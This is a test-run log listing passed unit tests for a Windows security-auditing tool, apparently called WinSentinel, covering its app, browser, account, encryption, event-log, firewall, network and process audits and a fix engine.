  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "8.6.4", expectedMajor: 8, expectedMinor: 6) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "24.09", expectedMajor: 24, expectedMinor: 9) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "v20.11.0", expectedMajor: 20, expectedMinor: 11) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "0.80", expectedMajor: 0, expectedMinor: 80) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_ValidVersions_ReturnsParsedVersion(input: "2.43.0.windows.1", expectedMajor: 2, expectedMinor: 43) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_Succeeds [24 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ScoreIsValid [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_VersionWithText_ExtractsVersion [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_HasValidTimestamps [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_DetectsInstalledPrograms [10 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_AllFindingsHaveCategory [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_MultipleRunsAreConsistent [17 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ContainsBloatwareCheck [8 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ContainsStoreAutoUpdateCheck [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_WarningFindingsHaveRemediation [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_NullOrEmpty_ReturnsNull(input: null) [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_NullOrEmpty_ReturnsNull(input: "   ") [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.ParseVersion_NullOrEmpty_ReturnsNull(input: "") [< 1 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_SupportsCancellation [8 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ContainsProgramsSummary [8 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ContainsEolCheck [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ContainsInstallLocationCheck [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_CriticalFindingsHaveRemediation [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_DurationIsReasonable [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_FindingsHaveRequiredFields [7 ms]
  Passed WinSentinel.Tests.Audits.AppSecurityAuditTests.RunAuditAsync_ProducesFindings [8 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_CriticalFindingsHaveRemediation [16 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksSavedPasswords [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksPopupBlocker [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_AllFindingsHaveCategory [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksEdgeOrChrome [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksTrackingProtection [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksSafeBrowsingOrSmartScreen [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_DurationIsReasonable [2 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ChecksAutoUpdate [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_WarningFindingsHaveRemediation [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_Succeeds [2 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_SupportsCancellation [2 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ScoreIsValid [3 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_MultipleRunsAreConsistent [5 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_FindingsHaveRequiredFields [2 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_HasValidTimestamps [4 ms]
  Passed WinSentinel.Tests.Audits.BrowserAuditTests.RunAuditAsync_ProducesFindings [2 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_ChecksPasswordPolicy [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_Timeout_ReturnsTimeout [6 s]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_MultiLineOutput_CapturesAll [768 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_NoFixCommand_ReturnsNoFixAvailable [1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_FailingCommand_ReturnsFailure [737 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_EmptyFixCommand_ReturnsNoFixAvailable [1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteCommandAsync_DryRun_Works [< 1 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_DryRun_DoesNotExecute [1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasTpmFinding [12 s]
  Passed WinSentinel.Tests.Services.FixEngineTests.ExecuteFixAsync_SimpleCommand_Succeeds [692 ms]
  Passed WinSentinel.Tests.Services.FixEngineTests.FixResult_StaticFactories_Work [< 1 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_ChecksGuestAccount [< 1 ms]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_CriticalFindingsHaveRemediation [< 1 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_FindingsHaveRequiredFields [6 s]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_ChecksAdminAccounts [< 1 ms]
  Passed WinSentinel.Tests.Audits.AccountAuditTests.RunAuditAsync_ProducesMultipleFindings [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasFailedLoginFinding [1 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasBitLockerFindings [6 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_FindingsHaveRequiredFields [1 s]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_FindingsHaveRequiredFields [< 1 ms]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.RunAuditAsync_ChecksArpTable [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasSecurityLogSizeFinding [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_CompletesWithinTimeout [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_ProducesFindings [1 s]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_Succeeds [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasPowerShellFinding [1 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_ScoreIsCalculated [6 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_CriticalFindingsHaveRemediation [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasEventLogServiceFinding [1 s]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_HasValidTimestamps [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasSystemErrorFinding [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasLogClearedFinding [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasServiceInstallFinding [1 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasCredentialGuardFinding [6 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasAuditPolicyFinding [1 s]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_AllFindingsHaveCorrectCategory [1 s]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasDefenderDetectionFinding [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_TimestampsAreSet [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasPrivilegeEscalationFinding [1 s]
  Passed WinSentinel.Tests.Audits.FirewallAuditTests.RunAuditAsync_ProducesFindings [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasCertificateFindings [6 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_HasAccountLockoutFinding [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_ScoreIsCalculated [1 s]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_SupportsCancellation [116 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.EventLogAuditTests.RunAuditAsync_Succeeds [1 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasEfsFinding [6 s]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.RunAuditAsync_LlmnrFindingsHaveRemediation [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_CompletesWithinTimeout [6 s]
  Passed WinSentinel.Tests.Audits.ProcessAuditTests.RunAuditAsync_ChecksProcessCount [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_CriticalFindingsHaveRemediation [6 s]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.ProcessAuditTests.RunAuditAsync_ChecksTempProcesses [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_ProducesFindings [6 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasTlsFindings [6 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_SupportsCancellation [199 ms]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.RunAuditAsync_ChecksDns [< 1 ms]
  Passed WinSentinel.Tests.Audits.ProcessAuditTests.RunAuditAsync_ScoreIsValid [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_Succeeds [6 s]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.Properties_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Audits.EncryptionAuditTests.RunAuditAsync_HasDpapiFinding [6 s]
  Passed WinSentinel.Tests.Audits.ProcessAuditTests.RunAuditAsync_ProducesMultipleFindings [< 1 ms]
  Passed WinSentinel.Tests.Audits.NetworkAuditTests.RunAuditAsync_AllFindingsHaveCategory [< 1 ms]
